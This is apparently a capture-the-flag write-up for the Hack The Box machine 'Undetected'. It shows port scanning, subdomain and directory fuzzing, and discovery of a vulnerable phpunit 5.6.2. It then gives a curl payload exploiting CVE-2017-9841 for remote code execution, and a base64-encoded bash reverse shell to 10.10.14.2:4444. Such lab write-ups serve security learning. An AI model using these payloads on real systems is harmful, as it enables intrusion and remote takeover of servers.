

```bash
nmap -sV -sC -Pn $ip --top-ports 4250
```

Open ports: 22 and 80.

Entering the IP in a browser we get to a website.

![Home](img/htb-undetected_01.png)

Revising the source code, we see that the menu "Store" is linking to http://store.djewelry.htb/.

Another way to find out:

```
# with gobuster
gobuster dns -d djewelry.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt 
```


Open /etc/hosts and add IP and  store.djewelry.htb, djewelry.htb.

After browsing around both websites, we found nothing noticeable, so we try to fuzz both subdomains:

```bash
# With wfuzz
wfuzz -c --hc 404 -t 200 -u http://store.djewelry.htb/FUZZ -w /usr/share/dirb/wordlists/common.txt  

wfuzz -c --hc 404 -t 200 -u http://djewelry.htb/FUZZ -w /usr/share/dirb/wordlists/common.txt  
```


Nothing interesting under main domain, but in http://store.djewelry.htb:

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://store.djewelry.htb/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                    
=====================================================================

000000001:   200        195 L    475 W      6203 Ch     "http://store.djewelry.htb/
                                                        "                          
000000013:   403        9 L      28 W       283 Ch      ".htpasswd"                
000000012:   403        9 L      28 W       283 Ch      ".htaccess"                
000000011:   403        9 L      28 W       283 Ch      ".hta"                     
000001114:   301        9 L      28 W       322 Ch      "css"                      
000001648:   301        9 L      28 W       324 Ch      "fonts"                    
000002021:   200        195 L    475 W      6203 Ch     "index.php"                
000001991:   301        9 L      28 W       325 Ch      "images"                   
000002179:   301        9 L      28 W       321 Ch      "js"                       
000003588:   403        9 L      28 W       283 Ch      "server-status"            
000004286:   301        9 L      28 W       325 Ch      "vendor"                   

Total time: 0
Processed Requests: 4614
Filtered Requests: 4603
Requests/sec.: 0

```


/vendor is a directory list, so we can browse all files and folders under /vendor.

After browsing for a while, we get information about this plugin with a vulnerable version installed  (all plugins installed with versions: http://store.djewelry.htb/vendor/composer/installed.json). Vulnerable plugin is "phpunit/phpunit","5.6.2".

Some exploits:

https://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/

In my case:

```
curl -XGET --data "<?php system('whoami');?>" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

```
www-data
```

Now, we can get a reverse shell:

My reverse code before b64 it: "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"

```
curl -XGET --data "<?php system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQo=|base64 -d|bash'); ?>" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```


See a walkthrough: https://0xdf.gitlab.io/2022/07/02/htb-undetected.html



